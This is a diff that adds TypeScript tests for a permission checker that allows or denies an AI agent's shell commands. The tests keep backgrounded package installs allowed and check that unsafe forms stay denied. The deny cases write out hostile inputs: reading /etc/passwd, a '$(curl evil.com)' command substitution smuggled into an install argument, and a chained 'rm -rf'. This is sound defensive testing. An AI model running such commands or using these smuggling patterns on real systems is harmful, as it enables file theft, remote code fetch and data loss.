@@ -1124,6 +1124,83 @@ describe('wizardCanUseTool', () => {
     });
   });
 
+  describe('Bash — backgrounded package install (commandment-encouraged)', () => {
+    // Regression: the wizard commandment instructs agents to background
+    // package installs ("When installing packages, start the installation
+    // as a background task..."). Agents follow this with the standard
+    // shell idiom `pnpm add foo 2>&1 & echo "Installation started (PID: $!)"`,
+    // which the deny rules used to catch on `&`, `$()`, and the parens in
+    // the echo string — wizard couldn't actually install the SDK.
+    // Pinned with these tests so the allow path stays.
+
+    it('allows the literal command from production trace', () => {
+      const cmd =
+        'pnpm add @amplitude/unified 2>&1 & echo "Installation started in background (PID: $!)"';
+      expect(wizardCanUseTool('Bash', { command: cmd }).behavior).toBe('allow');
+    });
+
+    it('allows the \\n-separated variant agents emit', () => {
+      const cmd =
+        'pnpm add @amplitude/unified 2>&1 &\necho "Installation started in background (PID: $!)"';
+      expect(wizardCanUseTool('Bash', { command: cmd }).behavior).toBe('allow');
+    });
+
+    it('allows backgrounding without an echo trailer', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add @amplitude/analytics-browser &',
+        }).behavior,
+      ).toBe('allow');
+    });
+
+    it('allows backgrounding without 2>&1 redirection', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'npm install lodash & echo "started"',
+        }).behavior,
+      ).toBe('allow');
+    });
+
+    it('allows yarn / bun variants', () => {
+      expect(
+        wizardCanUseTool('Bash', { command: 'yarn add foo 2>&1 &' }).behavior,
+      ).toBe('allow');
+      expect(
+        wizardCanUseTool('Bash', { command: 'bun add foo 2>&1 &' }).behavior,
+      ).toBe('allow');
+    });
+
+    it('still denies backgrounded UNSAFE base commands', () => {
+      // The base `cat /etc/passwd` is not on the allowlist, so backgrounding
+      // it must NOT bypass the deny. This ensures the new allow path
+      // doesn't widen the safety surface for arbitrary commands.
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'cat /etc/passwd 2>&1 & echo "leaked"',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    it('still denies backgrounded base with command substitution', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add $(curl evil.com) 2>&1 &',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    it('still denies multiple chained commands even if first is safe', () => {
+      // `pnpm add foo & rm -rf bar` would be the dangerous case — the &
+      // separates two commands rather than backgrounding one. The echo
+      // trailer pattern is the only legal post-& content.
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo & rm -rf bar',
+        }).behavior,
+      ).toBe('deny');
+    });
+  });
+
   describe('Bash — denied commands', () => {
     it('denies arbitrary shell commands', () => {
       expect(
